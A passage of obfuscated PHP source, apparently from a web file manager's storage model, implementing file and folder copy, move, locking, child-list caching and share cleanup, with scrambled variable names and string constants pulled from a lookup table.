unset(self::$_lockItemArr[$íˆ¢²ö]); CacheLock::unlock($íˆ¢²ö); } } public function isParentOf($¶Ş—®…°, $‚ÎÈ‰”†) { $”ñƒƒ“™ =& $_SERVER[¹òÍ›æş]; $ºûÈøê = $this->sourceInfo($¶Ş—®…°); $Ş©êÓŒ = $this->sourceInfo($‚ÎÈ‰”†); $´ÖıÖ÷ø = $ºûÈøê[$”ñƒƒ“™[549]] . $ºûÈøê[$”ñƒƒ“™[440]] . $”ñƒƒ“™[50]; $ªàñê× = $Ş©êÓŒ[$”ñƒƒ“™[549]] . $Ş©êÓŒ[$”ñƒƒ“™[440]] . $”ñƒƒ“™[50]; $âÃ†÷ÕÖ = strpos($ªàñê×, $´ÖıÖ÷ø) === 0; return $âÃ†÷ÕÖ; } private $targetIsDelete = 0; public function copy($Íè»¦î¹, $Ùë½‹‡ß, $ËôòÈ©è = REPEAT_REPLACE, $‡èÉÔ ¶ = '') { $„Ğñ“Ÿ¸ =& $_SERVER[¹òÍ›æş]; $™ÂûàÎù = $this->sourceInfo($Íè»¦î¹); $Ïİ¢âœ¾ = $this->sourceInfo($Ùë½‹‡ß); if (!$™ÂûàÎù || !$Ïİ¢âœ¾ || $Ïİ¢âœ¾[$„Ğñ“Ÿ¸[448]] != $„Ğñ“Ÿ¸[98]) { return !1; } if ($this->isParentOf($Íè»¦î¹, $Ùë½‹‡ß)) { return !1; } $˜·³î‰· = $‡èÉÔ ¶ ? $‡èÉÔ ¶ : $™ÂûàÎù[$„Ğñ“Ÿ¸[32]]; $this->lockCopyStart($Íè»¦î¹); $this->lockWriteStart($Ùë½‹‡ß, $˜·³î‰·); $Ë„èé¨‰ = array($„Ğñ“Ÿ¸[595] => array(), $„Ğñ“Ÿ¸[596] => array(), $„Ğñ“Ÿ¸[597] => array()); $this->targetIsDelete = intval($™ÂûàÎù[$„Ğñ“Ÿ¸[469]]); $‡Ûß¯Ñ  = $this->fileNameExistCache($Ùë½‹‡ß, $™ÂûàÎù[$„Ğñ“Ÿ¸[32]]); $Õ£Ë­å¿ = $this->_copy($Íè»¦î¹, $Ùë½‹‡ß, $ËôòÈ©è, $Ë„èé¨‰, !0, $‡èÉÔ ¶); $this->_childrenListClear(); $this->lockCopyEnd($Íè»¦î¹); $this->lockWriteEnd($Ùë½‹‡ß, $˜·³î‰·); if ($™ÂûàÎù[$„Ğñ“Ÿ¸[448]] == $„Ğñ“Ÿ¸[98] && $‡Ûß¯Ñ  == $Õ£Ë­å¿) { $this->folderSizeResetChildren($‡Ûß¯Ñ ); } Model($„Ğñ“Ÿ¸[598])->addAll($Ë„èé¨‰[$„Ğñ“Ÿ¸[596]], array(), !0); if ($‡Ûß¯Ñ  != $Õ£Ë­å¿ || $™ÂûàÎù[$„Ğñ“Ÿ¸[448]] == $„Ğñ“Ÿ¸[98]) { Model($„Ğñ“Ÿ¸[599])->eventCopy($Õ£Ë­å¿); } $this->saveAll($Ë„èé¨‰[$„Ğñ“Ÿ¸[597]]); Model($„Ğñ“Ÿ¸[210])->linkAdd($Ë„èé¨‰[$„Ğñ“Ÿ¸[595]]); $this->folderSizeReset($Ùë½‹‡ß); $this->updateModifyTime($Ùë½‹‡ß); return $Õ£Ë­å¿; } private function _copy($ù†›ó¨¬, $¿åØ¹ŠÄ, $º¿‘ë­‡, &$ÃÜÓú, $Ê›ÉñÔª, $ƒÅ«†¾Ñ = '') { $Âíõ¦˜û =& $_SERVER[¹òÍ›æş]; $×Ïà“Õ„ = $this->sourceInfoCache($ù†›ó¨¬); $éŞÒéÌÙ = $×Ïà“Õ„[$Âíõ¦˜û[448]] == $Âíõ¦˜û[98]; $¾®”ß² = $ƒÅ«†¾Ñ ? $ƒÅ«†¾Ñ : $×Ïà“Õ„[$Âíõ¦˜û[32]]; $şª–£ë’ = $this->fileNameExistCache($¿åØ¹ŠÄ, $¾®”ß²); if ($Ê›ÉñÔª) { $this->_childrenAllMake($ù†›ó¨¬); if ($éŞÒéÌÙ && $şª–£ë’) { $this->_childrenAllMake($şª–£ë’); } } if (!$şª–£ë’) { return $this->_copyCreate($ù†›ó¨¬, $¿åØ¹ŠÄ, $¾®”ß², $ÃÜÓú); } $òî§°²Á = $şª–£ë’; if ($éŞÒéÌÙ) { if ($º¿‘ë­‡ == REPEAT_RENAME_FOLDER) { $¾®”ß² = $this->fileNameAutoCache($¿åØ¹ŠÄ, $¾®”ß², $º¿‘ë­‡, $éŞÒéÌÙ); $òî§°²Á = $this->_copyCreate($ù†›ó¨¬, $¿åØ¹ŠÄ, $¾®”ß², $ÃÜÓú); } else { $ß¿ªÄÓ¥ = $this->_childrenList($ù†›ó¨¬); foreach ($ß¿ªÄÓ¥ as $¶Û•í²é) { $this->_copy($¶Û•í²é[$Âíõ¦˜û[440]], $şª–£ë’, $º¿‘ë­‡, $ÃÜÓú, !1); } } } else { if ($º¿‘ë­‡ == REPEAT_RENAME || $º¿‘ë­‡ == REPEAT_RENAME_FOLDER) { $¾®”ß² = $this->fileNameAutoCache($¿åØ¹ŠÄ, $¾®”ß², $º¿‘ë­‡, $éŞÒéÌÙ); $òî§°²Á = $this->_copyCreate($ù†›ó¨¬, $¿åØ¹ŠÄ, $¾®”ß², $ÃÜÓú); } else { if ($º¿‘ë­‡ == REPEAT_REPLACE) { $³›šèŞŒ = $this->sourceInfoCache($şª–£ë’); $÷¡§¦—„ = $this->fileHistory($³›šèŞŒ, $×Ïà“Õ„[$Âíõ¦˜û[506]], $×Ïà“Õ„[$Âíõ¦˜û[86]]); if ($÷¡§¦—„) { $ÃÜÓú[$Âíõ¦˜û[595]][] = $×Ïà“Õ„[$Âíõ¦˜û[506]]; } } else { if ($º¿‘ë­‡ == REPEAT_SKIP) { } } } Hook::trigger($Âíõ¦˜û[600], array($Âíõ¦˜û[601], $×Ïà“Õ„, 0)); } return $òî§°²Á; } private function _copyCreate($²‹¬‹‰¿, $ëÄ„ò•ƒ, $ú›£óØ, &$¸œ¼„Ïü) { $ˆñçíñ‡ =& $_SERVER[¹òÍ›æş]; $ìœÎóúØ = $this->sourceInfoCache($²‹¬‹‰¿); $³Ø‘ì×Ü = $this->sourceInfoCache($ëÄ„ò•ƒ); $¹Õãüü = $this->_makeItemData($ìœÎóúØ, $³Ø‘ì×Ü, $ú›£óØ); Hook::trigger($ˆñçíñ‡[602], $¹Õãüü); Hook::trigger($ˆñçíñ‡[603], array($ˆñçíñ‡[604], $¹Õãüü, 0)); $Ğ½íÉ¢· = $this->add($¹Õãüü); $€å»šŸÁ = array($ˆñçíñ‡[440] => $Ğ½íÉ¢·, $ˆñçíñ‡[32] => $ú›£óØ); $this->_copyApplyMeta($€å»šŸÁ, $¸œ¼„Ïü); if ($ìœÎóúØ[$ˆñçíñ‡[448]] != $ˆñçíñ‡[98]) { $¸œ¼„Ïü[$ˆñçíñ‡[595]][] = $ìœÎóúØ[$ˆñçíñ‡[506]]; return $Ğ½íÉ¢·; } $Æ²¤ĞÀ¿ = array(); $‚éÅŞ“Ù = array(); $this->_childrenListAll($²‹¬‹‰¿, $Æ²¤ĞÀ¿); $İ¬ëØÖŠ = count($Æ²¤ĞÀ¿); if ($İ¬ëØÖŠ == 0) { return $Ğ½íÉ¢·; } $„•œ“õ¢ = $this->sourceInfo($Ğ½íÉ¢·); foreach ($Æ²¤ĞÀ¿ as $ŒÁ‘ªı¸) { $Å´İ»©à = $this->_makeItemData($ŒÁ‘ªı¸, $„•œ“õ¢, $ŒÁ‘ªı¸[$ˆñçíñ‡[32]]); $Å´İ»©à[$ˆñçíñ‡[549]] = $ŒÁ‘ªı¸[$ˆñçíñ‡[549]]; $‚éÅŞ“Ù[] = $Å´İ»©à; } $this->chunkEventSet($ˆñçíñ‡[605], array($ˆñçíñ‡[606], $¹Õãüü, $İ¬ëØÖŠ)); $this->addAll($‚éÅŞ“Ù, array(), !1); $¬§îÕ†á = $this->where(array($ˆñçíñ‡[470] => $Ğ½íÉ¢·))->select(); $ÖÛŸÚ’£ = $this->_childrenMakeRelation($Æ²¤ĞÀ¿, $¬§îÕ†á); $ÖÛŸÚ’£[$²‹¬‹‰¿] = $Ğ½íÉ¢·; $ßŠñÙ‘ = array(); $Áùìêí = array(); foreach ($¬§îÕ†á as $ŒÁ‘ªı¸) { $İÖóÑ«ş = $ŒÁ‘ªı¸[$ˆñçíñ‡[440]]; $¦ÏãÉÓÁ = $this->_childrenMatch($ÖÛŸÚ’£, $ŒÁ‘ªı¸, $„•œ“õ¢); $ßŠñÙ‘[] = array($ˆñçíñ‡[440], $İÖóÑ«ş, $ˆñçíñ‡[470], $¦ÏãÉÓÁ[$ˆñçíñ‡[470]]); $Áùìêí[] = array($ˆñçíñ‡[440], $İÖóÑ«ş, $ˆñçíñ‡[549], $¦ÏãÉÓÁ[$ˆñçíñ‡[549]]); $this->_copyApplyMeta($ŒÁ‘ªı¸, $¸œ¼„Ïü); if ($ŒÁ‘ªı¸[$ˆñçíñ‡[448]] != $ˆñçíñ‡[98]) { $¸œ¼„Ïü[$ˆñçíñ‡[595]][] = $ŒÁ‘ªı¸[$ˆñçíñ‡[506]]; } } $this->chunkEventSet($ˆñçíñ‡[607], array($ˆñçíñ‡[608], $¹Õãüü, $İ¬ëØÖŠ)); $this->saveAll($ßŠñÙ‘); $this->chunkEventSet($ˆñçíñ‡[609], array($ˆñçíñ‡[610], $¹Õãüü, $İ¬ëØÖŠ)); $this->saveAll($Áùìêí); return $Ğ½íÉ¢·; } private function _childrenMakeRelation($·áè˜“°, $ñ±¢°şÆ) { $á­¸‘ÔÈ =& $_SERVER[¹òÍ›æş]; $¸ÉÑ™µ£ = array(); $Š¹¼’«ü = array(); foreach ($·áè˜“° as $‚·—¢¡—) { $¤ÆÌ±‹Ü = $‚·—¢¡—[$á­¸‘ÔÈ[32]] . $á­¸‘ÔÈ[8] . $‚·—¢¡—[$á­¸‘ÔÈ[549]]; $¸ÉÑ™µ£[$¤ÆÌ±‹Ü] = $‚·—¢¡—[$á­¸‘ÔÈ[440]]; } foreach ($ñ±¢°şÆ as $‚·—¢¡—) { $¤ÆÌ±‹Ü = $‚·—¢¡—[$á­¸‘ÔÈ[32]] . $á­¸‘ÔÈ[8] . $‚·—¢¡—[$á­¸‘ÔÈ[549]]; $Û¼ğœøà = $¸ÉÑ™µ£[$¤ÆÌ±‹Ü]; $Š¹¼’«ü[$Û¼ğœøà] = $‚·—¢¡—[$á­¸‘ÔÈ[440]]; } return $Š¹¼’«ü; } private function _childrenMatch($ªŒ…ùí, $¬ÁüÅúË, $—ŠéŠŸç) { $ø„ô“¬ó =& $_SERVER[¹òÍ›æş]; $ÄîºÛô• = $—ŠéŠŸç[$ø„ô“¬ó[549]]; $ ‡£ÕÓÎ = $this->parentLevelArray($¬ÁüÅúË[$ø„ô“¬ó[549]]); foreach ($ ‡£ÕÓÎ as $£¦ãÇä) { if (isset($ªŒ…ùí[$£¦ãÇä])) { $ÄîºÛô• .= $ªŒ…ùí[$£¦ãÇä] . $ø„ô“¬ó[611]; } } $ÄîºÛô• = rtrim($ÄîºÛô•, $ø„ô“¬ó[50]) . $ø„ô“¬ó[50]; $¥ØñÈ³¬ = $this->parentLevelArray($ÄîºÛô•); $Şä•¿Ë = $¥ØñÈ³¬[count($¥ØñÈ³¬) - 1]; return array($ø„ô“¬ó[470] => $Şä•¿Ë, $ø„ô“¬ó[549] => $ÄîºÛô•); } private function _makeItemData($ã³¥ö°, $‰µ¼”˜ª, $òÏ®éÈ£) { $áãûâÉ =& $_SERVER[¹òÍ›æş]; $“ãù­¨ö = array($áãûâÉ[612] => $ã³¥ö°[$áãûâÉ[448]], $áãûâÉ[458] => $òÏ®éÈ£, $áãûâÉ[613] => $ã³¥ö°[$áãûâÉ[450]] ? $ã³¥ö°[$áãûâÉ[450]] : $áãûâÉ[12], $áãûâÉ[507] => $ã³¥ö°[$áãûâÉ[506]] ? $ã³¥ö°[$áãûâÉ[506]] : 0, $áãûâÉ[583] => $ã³¥ö°[$áãûâÉ[86]] ? $ã³¥ö°[$áãûâÉ[86]] : 0, $áãûâÉ[614] => intval($‰µ¼”˜ª[$áãûâÉ[449]]), $áãûâÉ[615] => intval($‰µ¼”˜ª[$áãûâÉ[534]]), $áãûâÉ[616] => intval(USER_ID), $áãûâÉ[617] => intval(USER_ID), $áãûâÉ[439] => intval($‰µ¼”˜ª[$áãûâÉ[440]]), $áãûâÉ[618] => $‰µ¼”˜ª[$áãûâÉ[549]] . $‰µ¼”˜ª[$áãûâÉ[440]] . $áãûâÉ[50], $áãûâÉ[462] => $ã³¥ö°[$áãûâÉ[95]] ? $ã³¥ö°[$áãûâÉ[95]] : time(), $áãûâÉ[468] => 0, $áãûâÉ[619] => $áãûâÉ[12]); return $“ãù­¨ö; } private function _copyApplyMeta($›ã¶ßö, &$óÙÊšùÏ) { $Šåû®« =& $_SERVER[¹òÍ›æş]; $ñ•Ÿåæ¿ = $›ã¶ßö[$Šåû®«[440]]; $àü¨®·Æ = $›ã¶ßö[$Šåû®«[32]]; if (!isset($›ã¶ßö[$Šåû®«[620]]) || !$›ã¶ßö[$Šåû®«[620]] || $›ã¶ßö[$Šåû®«[620]] == $Šåû®«[208]) { $óÙÊšùÏ[$Šåû®«[597]][] = array($Šåû®«[440], $ñ•Ÿåæ¿, $Šåû®«[620], short_id($ñ•Ÿåæ¿)); } if (Input::check($àü¨®·Æ, $Šåû®«[621])) { $óÙÊšùÏ[$Šåû®«[596]][] = array($Šåû®«[440] => $ñ•Ÿåæ¿, $Šåû®«[104] => $Šåû®«[503], $Šåû®«[412] => str_replace($Šåû®«[53], $Šåû®«[12], Pinyin::get($àü¨®·Æ))); $óÙÊšùÏ[$Šåû®«[596]][] = array($Šåû®«[440] => $ñ•Ÿåæ¿, $Šåû®«[104] => $Šåû®«[502], $Šåû®«[412] => Pinyin::get($àü¨®·Æ, $Šåû®«[622])); } $óÙÊšùÏ[$Šåû®«[596]][] = array($Šåû®«[440] => $ñ•Ÿåæ¿, $Šåû®«[104] => $Šåû®«[482], $Šåû®«[412] => KodSort::makeStr($àü¨®·Æ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($êŠâÁƒª) { $ˆÏô§À• =& $_SERVER[¹òÍ›æş]; $»ùÛİ¤ = $this->sourceInfo($êŠâÁƒª); $¦„›äëÇ = $ˆÏô§À•[623]; $úûµƒÜ = array($ˆÏô§À•[549] => array($ˆÏô§À•[578], $»ùÛİ¤[$ˆÏô§À•[549]] . $êŠâÁƒª . $ˆÏô§À•[579]), $ˆÏô§À•[469] => $this->targetIsDelete); $¥§ƒßİô = $this->field($¦„›äëÇ)->where($úûµƒÜ)->select(); if (!$¥§ƒßİô) { return; } $¥§ƒßİô = array_to_keyvalue($¥§ƒßİô, $ˆÏô§À•[440]); foreach ($¥§ƒßİô as $‘ÛÖš˜ë) { $¹Î¦ü‡ = $‘ÛÖš˜ë[$ˆÏô§À•[470]]; $êŠâÁƒª = $‘ÛÖš˜ë[$ˆÏô§À•[440]]; if (!isset($this->_childrenListCache[$êŠâÁƒª]) && $‘ÛÖš˜ë[$ˆÏô§À•[448]] == $ˆÏô§À•[98]) { $this->_childrenListCache[$êŠâÁƒª] = array(); } if (!isset($this->_childrenListCache[$¹Î¦ü‡])) { $this->_childrenListCache[$¹Î¦ü‡] = array(); } $this->_childrenListCache[$¹Î¦ü‡][$êŠâÁƒª] = $‘ÛÖš˜ë; $this->_childrenItemCache[$êŠâÁƒª] = $‘ÛÖš˜ë; } } private function _childrenListAll($êÏ®òçœ, &$° ºÅ˜) { $…Öªï™ =& $_SERVER[¹òÍ›æş]; if (!isset($this->_childrenListCache[$êÏ®òçœ])) { return; } $œÉŒŞ…È = $this->_childrenListCache[$êÏ®òçœ]; foreach ($œÉŒŞ…È as $ÉÑ»Ëô¦ => $ª†Üœ) { $° ºÅ˜[$ÉÑ»Ëô¦] = $ª†Üœ; if ($ª†Üœ[$…Öªï™[448]] == $…Öªï™[98]) { $this->_childrenListAll($ÉÑ»Ëô¦, $° ºÅ˜); } } } private function sourceInfoCache($î¦·öé•) { if (isset($this->_childrenItemCache[$î¦·öé•])) { return $this->_childrenItemCache[$î¦·öé•]; } return $this->sourceInfo($î¦·öé•); } private function _childrenList($®„ÄïÓ·) { if (isset($this->_childrenListCache[$®„ÄïÓ·])) { return $this->_childrenListCache[$®„ÄïÓ·]; } return $this->_childrenListSelect($®„ÄïÓ·); } private function _childrenListSelect($š™îº±ß) { $èÏéÖİÌ =& $_SERVER[¹òÍ›æş]; $§Ö‡«Ñ = array($èÏéÖİÌ[470] => $š™îº±ß, $èÏéÖİÌ[469] => $this->targetIsDelete); $¼–û¦¡ã = $this->where($§Ö‡«Ñ)->select(); $¼–û¦¡ã = $¼–û¦¡ã ? $¼–û¦¡ã : array(); $ÄÑ½‚Š = array_to_keyvalue($¼–û¦¡ã, $èÏéÖİÌ[440]); $this->_childrenListCache[$š™îº±ß] = $ÄÑ½‚Š; foreach ($ÄÑ½‚Š as $š™îº±ß => $ÉÑÚ”óö) { $this->_childrenItemCache[$š™îº±ß] = $ÉÑÚ”óö; } return $ÄÑ½‚Š; } private function fileNameExistCache($¹×¥è„ã, $³›áŒ¹”) { $Úïğˆ± =& $_SERVER[¹òÍ›æş]; $³›áŒ¹” = strtolower($³›áŒ¹”); $¯çÈõŠí = $this->_childrenList($¹×¥è„ã); foreach ($¯çÈõŠí as $ğÔ«Ìı) { if ($³›áŒ¹” == strtolower($ğÔ«Ìı[$Úïğˆ±[32]])) { return $ğÔ«Ìı[$Úïğˆ±[440]]; } } return !1; } private function fileNameAutoCache($ŞŸ¥‚”, $’¢Œıñ, $’âÛùœ, $ÖÜ“†‡Á) { $ÜÅØñ¨Ê =& $_SERVER[¹òÍ›æş]; $ş¡Ä×‹Ì = $this->_childrenList($ŞŸ¥‚”); $ÈÒæ = array_to_keyvalue($ş¡Ä×‹Ì, $ÜÅØñ¨Ê[12], $ÜÅØñ¨Ê[32]); return $this->fileNameAutoGet($ÈÒæ, $’¢Œıñ, $’âÛùœ, $ÖÜ“†‡Á); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ˆ«ô£“¼, $ç¿ô“ş, $ÏËµÎ¦´ = REPEAT_REPLACE, $íµÖî³ = '') { $˜æ–à”¼ =& $_SERVER[¹òÍ›æş]; $‡Ÿ«Ù‹ = $this->sourceInfo($ˆ«ô£“¼); $Òëîš­ù = $this->sourceInfo($ç¿ô“ş); if ($‡Ÿ«Ù‹[$˜æ–à”¼[470]] == $Òëîš­ù[$˜æ–à”¼[440]]) { if ($‡Ÿ«Ù‹[$˜æ–à”¼[469]] == $˜æ–à”¼[98]) { Model($˜æ–à”¼[467])->restore(array($ˆ«ô£“¼)); } if (!$íµÖî³ || $íµÖî³ == $‡Ÿ«Ù‹[$˜æ–à”¼[32]]) { return $ˆ«ô£“¼; } } $ı¼›Óİ = $this->pathInfoMore($ˆ«ô£“¼); if ($this->isParentOf($ˆ«ô£“¼, $ç¿ô“ş)) { return !1; } if (!$‡Ÿ«Ù‹ || !$Òëîš­ù || $Òëîš­ù[$˜æ–à”¼[448]] != $˜æ–à”¼[98]) { return !1; } Hook::trigger($˜æ–à”¼[624], $ı¼›Óİ); $this->targetIsDelete = intval($‡Ÿ«Ù‹[$˜æ–à”¼[469]]); if ($‡Ÿ«Ù‹[$˜æ–à”¼[470]] == $ç¿ô“ş && $íµÖî³ != $‡Ÿ«Ù‹[$˜æ–à”¼[32]]) { $†Éäş¸ = $this->fileNameExist($ç¿ô“ş, $íµÖî³); if ($†Éäş¸ && $‡Ÿ«Ù‹[$˜æ–à”¼[448]] == $˜æ–à”¼[208]) { $–Í›Àê£ = $this->sourceInfo($†Éäş¸); $ÆêÇ„ì = $this->fileHistory($–Í›Àê£, $‡Ÿ«Ù‹[$˜æ–à”¼[506]], $‡Ÿ«Ù‹[$˜æ–à”¼[86]]); if (!$ÆêÇ„ì) { Model($˜æ–à”¼[509])->remove($‡Ÿ«Ù‹[$˜æ–à”¼[506]]); } $this->removeNow($ˆ«ô£“¼, !1); $this->folderSizeReset($ç¿ô“ş); Hook::trigger($˜æ–à”¼[625], $ı¼›Óİ); return $†Éäş¸; } } $€Íƒ—•œ = $íµÖî³ ? $íµÖî³ : $‡Ÿ«Ù‹[$˜æ–à”¼[32]]; $this->lockMoveStart($ˆ«ô£“¼); $this->lockWriteStart($ç¿ô“ş, $€Íƒ—•œ); $ôÅ›ËÇ´ = array($˜æ–à”¼[595] => array(), $˜æ–à”¼[626] => !1); $this->clearShare($ˆ«ô£“¼, $ç¿ô“ş); $ÈÇ€á˜º = $this->fileNameExistCache($ç¿ô“ş, $‡Ÿ«Ù‹[$˜æ–à”¼[32]]); $ÏĞÒ‹§ø = $this->_move($ˆ«ô£“¼, $ç¿ô“ş, $ÏËµÎ¦´, $ôÅ›ËÇ´, $íµÖî³); $this->sourceCacheClear(); if ($‡Ÿ«Ù‹[$˜æ–à”¼[448]] == $˜æ–à”¼[98] && $ÈÇ€á˜º) { $this->folderSizeResetChildren($ÏĞÒ‹§ø); } Model($˜æ–à”¼[210])->linkAdd($ôÅ›ËÇ´[$˜æ–à”¼[595]]); if ($ÈÇ€á˜º && $ôÅ›ËÇ´[$˜æ–à”¼[626]]) { $this->removeNow($ˆ«ô£“¼, !1); } $this->lockMoveEnd($ˆ«ô£“¼); $this->lockWriteEnd($ç¿ô“ş, $€Íƒ—•œ); $this->folderSizeReset($‡Ÿ«Ù‹[$˜æ–à”¼[470]]); $this->folderSizeReset($ç¿ô“ş); $Â‘£îÑ = array($‡Ÿ«Ù‹[$˜æ–à”¼[470]], $ç¿ô“ş); if ($‡Ÿ«Ù‹[$˜æ–à”¼[448]] == $˜æ–à”¼[98]) { $Â‘£îÑ[] = $ˆ«ô£“¼; } $this->updateModifyTime($Â‘£îÑ); Model($˜æ–à”¼[599])->eventMove($ˆ«ô£“¼, $‡Ÿ«Ù‹[$˜æ–à”¼[470]], $ç¿ô“ş); Hook::trigger($˜æ–à”¼[625], $ı¼›Óİ); return $ÏĞÒ‹§ø; } private function _move($é¾ûö, $Œûû», $˜çİ „, &$œŒò¸¯¥, $£ÒõœÓ = '') { $«îé¸†° =& $_SERVER[¹òÍ›æş]; $Şã¸ü¨ = $this->sourceInfo($é¾ûö); $Óì¿ÒÜÔ = $Şã¸ü¨[$«îé¸†°[448]] == $«îé¸†°[98]; $Şî¡Ğîà = $£ÒõœÓ ? $£ÒõœÓ : $Şã¸ü¨[$«îé¸†°[32]]; $åñÉùŸ = $this->fileNameExistCache($Œûû», $Şî¡Ğîà); $this->lockMoveStart($é¾ûö); $this->lockWriteStart($Œûû», $Şî¡Ğîà); if (!$åñÉùŸ) { return $this->_moveForce($é¾ûö, $Œûû», $Şî¡Ğîà); } $ááÍ»‡À = $åñÉùŸ; $óÙ«Ğâ = !1; if ($Óì¿ÒÜÔ) { if ($˜çİ „ == REPEAT_RENAME_FOLDER) { $Şî¡Ğîà = $this->fileNameAuto($Œûû», $Şî¡Ğîà, $˜çİ „, $Óì¿ÒÜÔ); $ááÍ»‡À = $this->_moveForce($é¾ûö, $Œûû», $Şî¡Ğîà); } else { if ($˜çİ „ == REPEAT_RENAME_FOLDER) { $˜çİ „ = REPEAT_RENAME; } $‚Å­µÎÜ = $this->_childrenListSelect($é¾ûö); foreach ($‚Å­µÎÜ as $ÜïÀŸÄ¿) { $this->_move($ÜïÀŸÄ¿[$«îé¸†°[440]], $åñÉùŸ, $˜çİ „, $œŒò¸¯¥); } $óÙ«Ğâ = !0; } } else { if ($˜çİ „ == REPEAT_SKIP) { $óÙ«Ğâ = !0; } else { if ($˜çİ „ == REPEAT_RENAME || $˜çİ „ == REPEAT_RENAME_FOLDER) { $Şî¡Ğîà = $this->fileNameAuto($Œûû», $Şî¡Ğîà, $˜çİ „, $Óì¿ÒÜÔ); $ááÍ»‡À = $this->_moveForce($é¾ûö, $Œûû», $Şî¡Ğîà); } else { if ($˜çİ „ == REPEAT_REPLACE) { $ˆØ¹¤†Ï = $this->sourceInfoCache($åñÉùŸ); $ñÚÔãËô = $this->fileHistory($ˆØ¹¤†Ï, $Şã¸ü¨[$«îé¸†°[506]], $Şã¸ü¨[$«îé¸†°[86]]); $óÙ«Ğâ = !0; if ($ñÚÔãËô) { $œŒò¸¯¥[$«îé¸†°[595]][] = $Şã¸ü¨[$«îé¸†°[506]]; } } } } } if ($óÙ«Ğâ && !$œŒò¸¯¥[$«îé¸†°[626]]) { $œŒò¸¯¥[$«îé¸†°[626]] = !0; } return $ááÍ»‡À; } private function _moveForce($ï«¢ƒô, $¶æìô, $¸Ü»Øß) { $ùô‹ƒê• =& $_SERVER[¹òÍ›æş]; $³¿×ñ‰ö = $this->sourceInfo($ï«¢ƒô); $ßã´’Ğã = $this->sourceInfo($¶æìô); $Ëì°¾× = $³¿×ñ‰ö[$ùô‹ƒê•[448]] == $ùô‹ƒê•[98]; $‘’œûÜ = array($ùô‹ƒê•[439] => $ßã´’Ğã[$ùô‹ƒê•[440]], $ùô‹ƒê•[618] => $ßã´’Ğã[$ùô‹ƒê•[549]] . $ßã´’Ğã[$ùô‹ƒê•[440]] . $ùô‹ƒê•[50], $ùô‹ƒê•[614] => $ßã´’Ğã[$ùô‹ƒê•[449]], $ùô‹ƒê•[615] => $ßã´’Ğã[$ùô‹ƒê•[534]], $ùô‹ƒê•[617] => USER_ID, $ùô‹ƒê•[458] => $¸Ü»Øß); $‰ÅÆãúÛ = $³¿×ñ‰ö[$ùô‹ƒê•[449]] == SourceModel::TYPE_GROUP && $ßã´’Ğã[$ùô‹ƒê•[449]] == SourceModel::TYPE_GROUP && $³¿×ñ‰ö[$ùô‹ƒê•[534]] == $ßã´’Ğã[$ùô‹ƒê•[534]]; if (!$‰ÅÆãúÛ && $this->moveClearAuth) { Model($ùô‹ƒê•[531])->authClear($ï«¢ƒô); } $¥İ†›‘ = $³¿×ñ‰ö[$ùô‹ƒê•[469]] == $ùô‹ƒê•[98] && $ßã´’Ğã[$ùô‹ƒê•[469]] != $ùô‹ƒê•[98]; if ($¥İ†›‘) { $‘’œûÜ[$ùô‹ƒê•[468]] = 0; } if ($Ëì°¾×) { $õÚíûÁµ = array($ùô‹ƒê•[618] => array($ùô‹ƒê•[578], $³¿×ñ‰ö[$ùô‹ƒê•[549]] . $³¿×ñ‰ö[$ùô‹ƒê•[440]] . $ùô‹ƒê•[579])); $ØÁêşÉ¹ = $³¿×ñ‰ö[$ùô‹ƒê•[549]] . $³¿×ñ‰ö[$ùô‹ƒê•[440]] . $ùô‹ƒê•[50]; $óöÛô¢µ = $ßã´’Ğã[$ùô‹ƒê•[549]] . $ßã´’Ğã[$ùô‹ƒê•[440]] . $ùô‹ƒê•[50] . $³¿×ñ‰ö[$ùô‹ƒê•[440]] . $ùô‹ƒê•[50]; $éËæ†Ñ° = array($ùô‹ƒê•[618] => array($ùô‹ƒê•[627], "\x72\145\x70\154\x61\x63\x65\50\160\141\x72\145\x6e\x74\x4c\x65\x76\145\154\x2c\47{$ØÁêşÉ¹}\x27\54\x27{$óöÛô¢µ}\47\x29"), $ùô‹ƒê•[614] => $ßã´’Ğã[$ùô‹ƒê•[449]], $ùô‹ƒê•[615] => $ßã´’Ğã[$ùô‹ƒê•[534]]); if ($¥İ†›‘) { $éËæ†Ñ°[$ùô‹ƒê•[468]] = 0; } $this->where($õÚíûÁµ)->data($éËæ†Ñ°)->save(); } $this->where(array($ùô‹ƒê•[455] => $ï«¢ƒô))->data($‘’œûÜ)->save(); return $ï«¢ƒô; } private function clearShare($‚’ˆ¸Ÿ, $Àôğ“¹©) { $º˜Å”‡¯ =& $_SERVER[¹òÍ›æş]; $ùºöäâÔ = $this->sourceInfo($‚’ˆ¸Ÿ); $Å±ŸËè° = $this->sourceInfo($Àôğ“¹©); if ($ùºöäâÔ[$º˜Å”‡¯[534]] == $Å±ŸËè°[$º˜Å”‡¯[534]] && $ùºöäâÔ[$º˜Å”‡¯[449]] == $º˜Å”‡¯[628]) { return; } $õ¥ˆ¿Û = array($º˜Å”‡¯[549] => array($º˜Å”‡¯[578], $ùºöäâÔ[$º˜Å”‡¯[549]] . $‚’ˆ¸Ÿ . $º˜Å”‡¯[579])); $ô§·Î°­ = $this->field($º˜Å”‡¯[455])->where($õ¥ˆ¿Û)->getField($º˜Å”‡¯[440], !0); if (!$ô§·Î°­) { return; } $õ¥ˆ¿Û = array($º˜Å”‡¯[440] => array($º˜Å”‡¯[7], $ô§·Î°­), $º˜Å”‡¯[629] => 1); $ãïàÕüÂ = Model($º˜Å”‡¯[630])->field($º˜Å”‡¯[631])->where($õ¥ˆ¿Û)->select(); if (!$ãïàÕüÂ) { return; } $ãïàÕüÂ = array_to_keyvalue($ãïàÕüÂ, $º˜Å”‡¯[12], $º˜Å”‡¯[631]); $õ¥ˆ¿Û = array($º˜Å”‡¯[631] => array($º˜Å”‡¯[7], $ãïàÕüÂ)); Model($º˜Å”‡¯[630])->where($õ¥ˆ¿Û)->save(array($º˜Å”‡¯[629] => 0)); Model($º˜Å”‡¯[632])->where($õ¥ˆ¿Û)->delete(); } public function copyFolderFromIO($†óéëÆÑ, $§™£ê­ö, $÷øŠøÒ, $¥Ä“¸¬”, $ì‡¸×æÃ, $»ğ‹ôìí = false) { $˜¼ëŞê” =& $_SERVER[¹òÍ›æş]; $­îó¥ Ú = array($˜¼ëŞê”[596] => array(), $˜¼ëŞê”[597] => array(), $˜¼ëŞê”[595] => array(), $˜¼ëŞê”[633] => array()); $µÍ‚ğäÃ = $»ğ‹ôìí ? $»ğ‹ôìí : 